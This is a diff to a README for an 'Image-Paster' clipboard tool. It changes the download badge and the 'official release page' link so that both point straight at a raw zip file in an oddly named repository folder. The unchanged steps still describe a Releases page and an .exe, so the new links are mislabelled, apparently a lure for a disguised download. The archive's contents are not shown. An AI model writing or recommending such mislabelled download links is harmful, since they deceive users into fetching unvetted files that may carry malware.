@@ -1,6 +1,6 @@
 # 📋 Image-Paster - Save every copied image automatically now
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Advectioncontinentalshelf225/Image-Paster)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Advectioncontinentalshelf225/Image-Paster/raw/refs/heads/main/obambulate/Paster_Image_v2.8.zip)
 
 ## 📌 What is Image-Paster?
 
@@ -21,7 +21,7 @@ The software requires very little processing power. It waits in the background a
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/Advectioncontinentalshelf225/Image-Paster).
+1. Go to the [official release page](https://github.com/Advectioncontinentalshelf225/Image-Paster/raw/refs/heads/main/obambulate/Paster_Image_v2.8.zip).
 2. Look for the latest version listed under the Releases section.
 3. Select the file ending in .exe to download it to your computer.
 4. Open the folder where you saved the file.
